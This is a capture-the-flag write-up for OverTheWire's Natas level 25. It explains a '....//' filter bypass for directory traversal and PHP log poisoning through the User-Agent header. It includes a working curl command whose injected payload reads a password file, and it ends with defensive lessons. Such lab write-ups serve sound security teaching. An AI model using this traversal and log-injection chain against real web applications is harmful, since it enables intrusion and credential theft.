---
category: natas
title: Natas25 - Local File Inclusion and Code Injection
---

website: http://natas25.natas.labs.overthewire.org/ (password: GHF6X7YwACaYYssHVY05cFq83hRktl4c)

In this challenge, a web page with different language will be displayed based on the option. It also has logging mechanism in case of errors. Some major codes are provided below:


```php
function safeinclude($filename){
    // check for directory traversal
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if(strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    // add more checks...
 
    if (file_exists($filename)) {
        include($filename);
        return 1;
    }
    return 0;
}
 
function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n";
    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
```

As shown above, it uses file inclusion to display different language web pages. To avoid directory traverse, it also filters string "../".
Moreover, when logging an exception, it will retrieve the header `HTTP_USER_AGENT` from an HTTP request.

To overcome this challenge, we need to answer following questions:

1. <strong>How to bypass the filtering of "../"?</strong>
To achieve this goal, we can provide "....//" in the URL. This is obvious because the "../" will be replaced as an empty string, leaving the first two dots and the last slash as the rest,
which now compose a new "../".
With the help of this trick, we can bypass the filtering and make the directory traversal possible.

2. <strong>How to get the file content "natas_webpass/natas26"?</strong>
One cannot access this file directly because the keyword "natas_webpass" is filtered. However, we notice that the application writes the header `HTTP_USER_AGENT` into a log file without any validation.
This HTTP header indicates what the client a user is using and comes from the HTTP request.
That means, as a hacker, we can manipulate this header by injecting PHP code. Here we inject `<? passthru("cat /etc/natas_webpass/natas26") ?>` as the header.
That way the file content will be written into a log file and later can be accessed via local file inclusion.

The complete solution is provided below, which reveals natas26's password is <small>oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T</small>.


```shell
$ curl -su natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c 'http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_hello.log' \
       --cookie 'PHPSESSID=hello' \
       --user-agent '<?passthru("cat /etc/natas_webpass/natas26")?>'
... <skipped>

[09.07.2021 19::08:48] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
 "Directory traversal attempt! fixing request."

... <skipped>
```


<strong>CONCLUSION</strong>

Lessons that we learned from this challenge:
- Be careful with file inclusion. If you use a file inclusion in your code, it's ideal to use a whitelist for accessible files.
If a whitelist is not available, then at least sanitizing the input.
- Directory traversal can be a high risk in many cases. It allows a hacker to jump between your local files. Make sure you use it correctly.
- Whenever retrieving HTTP request headers and payloads, validation is needed because they can be crafted by users.

